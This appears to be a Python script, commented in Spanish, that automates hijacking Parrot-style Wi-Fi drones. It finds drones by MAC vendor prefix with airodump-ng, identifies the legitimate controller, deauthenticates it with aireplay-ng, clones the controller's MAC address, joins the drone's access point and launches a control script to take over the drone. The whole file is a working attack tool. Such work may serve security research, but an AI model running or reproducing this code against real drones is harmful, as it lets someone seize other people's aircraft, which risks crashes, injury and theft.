#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Javier Pinzon Diaz
'''
TO-DO
- [x] Buscar drones
- [x] Buscar clientes
- [x] Deauth (Añadir channel)
- [x] Cambiar MAC
- [x] Conectar a AP
- [x] Ver video en tiempo real
- [x] Como detectar nombre de la interfaz de red
- [ ] Revisar "Console" (estética)
- [x] Añadir colores para output
- [ ] Revisar handler
- [ ] Matar procesos en ejecución en el handler

'''

# import asyncio
# import pyrcrack
# from re import match

import csv
import time
from rich.console import Console

import signal
import os

import re
import signal
import subprocess
from tabulate import tabulate
from termcolor import colored

import argparse

# Parser
parser = argparse.ArgumentParser()
parser.add_argument("interface", help="Interface to use", type=str)
parser.add_argument('-i', '--interface2', help='Interface to use', type=str)

iface=""
iface_mon=""
interface=""
pro=None

# Al hacer Ctrl+C, se quita el modo monitor
def handler(signum, frame):
    """Exit the program."""
    print('\nExiting...')
    try:
        print("Killing process...")
        os.killpg(os.getpgid(pro.pid), signal.SIGTERM)  # Send the signal to all the process groups

        pass
    except:
        print(colored('ERROR','red'))
    finally:
        print("Process killed")


    try:
        print("Removing temp files...")
        os.system('rm /tmp/airotemp*')
    except:
        print(colored('ERROR','red'))
    finally:
        print("Temp files removed")


    try:
        print("Removing monitor mode...")
        os.system(f'airmon-ng stop {interface} > /dev/null 2>&1')
    except:
        print(colored('ERROR','red'))
    finally:
        print("Monitor mode removed")

    print(colored('Bye!'))
    exit(1)
    


signal.signal(signal.SIGINT, handler)



# RegEx para MAC de los drones
regMAC="^90:03:B7|^00:12:1C|^90:3A:E6|^A0:14:3D|^00:12:1C|^00:26:7E/g"

# Busqueda de drones
def searchDrone():
    global pro
    print(colored("[?] Searching drones...", 'yellow'))
    # console.print(f'{interface}')
    cmd=f'airodump-ng --output-format csv --write-interval 1 --write /tmp/airotemp {interface}'

    pro = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                        shell=True, preexec_fn=os.setsid) 
    drone_MAC=""
    channel=int()
    essid=""
    # Busca hasta que encuentra un drone
    while(True):
        try:
            with open('/tmp/airotemp-01.csv', 'r') as csv_file:
                reader = csv.reader(csv_file)
                data=list(reader)
                for i in data:
                    if i != []:
                        if re.search(regMAC, i[0]):
                            if i[13]!="":
                                print(colored("[!] New drone found", 'green'))

                                table=[["ESSID", "BSSID", "Channel"],[i[13],i[0],i[3]]]
                                # Tabla con los datos del dron
                                print(tabulate(table, headers="firstrow", tablefmt="fancy_grid"))
                                drone_MAC=i[0]
                                channel=i[3]
                                essid=i[13]
                                break

                if drone_MAC!="":
                    break
        except:
            pass

    # Mata el proceso airodump
    os.killpg(os.getpgid(pro.pid), signal.SIGTERM)  # Send the signal to all the process groups
    os.system('rm /tmp/airotemp*')
    return drone_MAC, channel, essid

# Busqueda de cliente conectado al drone
def searchClient(bssid):
    print(colored("[?] Searching clients...", 'yellow'))

    cmd=f'airodump-ng --bssid "{bssid}" --output-format csv --write-interval 1 --write /tmp/airotemp {interface}'

    pro = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                        shell=True, preexec_fn=os.setsid) 
    client_MAC=""
    while(True):
        try:
            with open('/tmp/airotemp-01.csv', 'r') as csv_file:
                reader = csv.reader(csv_file)
                a=list(reader)
                if a[5][0]:
                    client_MAC=a[5][0]
                    print(colored("[!] New client found", 'green'))
                    print(colored(f'Client MAC: {client_MAC}','green'))

                    break
        except:
            pass

    # Mata el proceso airodump
    os.killpg(os.getpgid(pro.pid), signal.SIGTERM)  # Send the signal to all the process groups
    os.system('rm /tmp/airotemp*')
    return client_MAC

''' Function to deauth legitimate client '''
def deauth(bssid,client_MAC):
    print(colored("Deauthenticating...", 'blue'))
    cmd=f'aireplay-ng -0 100 -a {bssid} -c {client_MAC} {interface}'
    pro = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                        shell=True, preexec_fn=os.setsid)
    time.sleep(5)

    os.killpg(os.getpgid(pro.pid), signal.SIGTERM)

''' This function is used to change the MAC address to the client MAC address '''
def changeMAC(client_MAC, mode):
    print("Changing MAC...")
    cmd=f'ifconfig {interface} down > /dev/null 2>&1'
    os.system(cmd)
    if mode=="random":
        cmd=f'macchanger -a {interface} > /dev/null 2>&1'
    elif mode=="client":
        cmd=f'macchanger --mac={client_MAC} {interface} > /dev/null 2>&1'
    os.system(cmd)
    cmd=f'ifconfig {interface} up > /dev/null 2>&1'
    os.system(cmd)
    print("MAC changed successfully")


def switchInterface(mode, channel=None):

    global interface

    if mode=="monitor":
        if channel is not None:
            cmd=f'airmon-ng start {interface} {channel} > /dev/null 2>&1 '
        else:
            cmd=f'airmon-ng start {interface} > /dev/null 2>&1'
        os.system(cmd)
        interface=iface_mon

    elif mode=="managed":
        cmd=f'airmon-ng stop {interface} > /dev/null 2>&1'
        os.system(cmd)
        interface=iface



''' Function to connect to the drone AP '''
def connectToAP(bssid):
    global interface

    print(colored("[?] Connecting to AP...",'yellow'))
    # cmd=f'nmcli d wifi connect {bssid} > /dev/null 2>&1'
    cmd=f'sudo iwconfig {interface} essid {bssid}'
    os.system(cmd)
    print(colored("Connected to AP",'green'))
    time.sleep(3)
    print(colored("[?]Requesting an IP...",'yellow'))
    cmd=f'sudo dhclient {interface}'
    os.system(cmd)
print(colored("Done",'green'))
def main():    
    # Ponemos la tarjeta de red en modo monitor
    switchInterface("monitor")

    # Buqueda de drone (bssid y canal)
    bssid_drone, channel, essid=searchDrone()

    # Busqueda de cliente conectado al dron (bssid)
    bssid_cliente=searchClient(bssid_drone)
    print(f'Drone: {bssid_drone} - Cliente: {bssid_cliente}')

    # Ponemos la tarjeta de red en modo monitor en el canal del drone
    switchInterface("managed")
    switchInterface("monitor", channel)

    # Deauth al cliente
    deauth(bssid_drone,bssid_cliente)

    # Ponemos la tarjeta de red en modo managed
    switchInterface("managed")

    # Impersonamos la MAC del cliente    
    changeMAC(bssid_cliente,"client")

    # Nos conectamos al AP
    #connectToAP(bbsid_drone)
    connectToAP(essid)

    # print(colored('[?] Trying to play video...','yellow'))
    print(colored('[?] Taking the control','yellow'))
    time.sleep(10)

    # Ejecutamos el script con el control del drone
    cmd=f'python2.7 python-ardrone/drone_control.py'
    os.system(cmd)
    # Reproducimos el video del drone
    # os.system('ffplay tcp://192.168.1.1:5555 -framerate 70 > /dev/null 2>&1')


if __name__ == "__main__":
    args = parser.parse_args()
    variables = vars(args)
    # Variables
    iface=variables['interface']
    iface_mon=variables['interface2']
    iface_mon=iface if iface_mon is None else iface_mon
    interface=iface
    main()



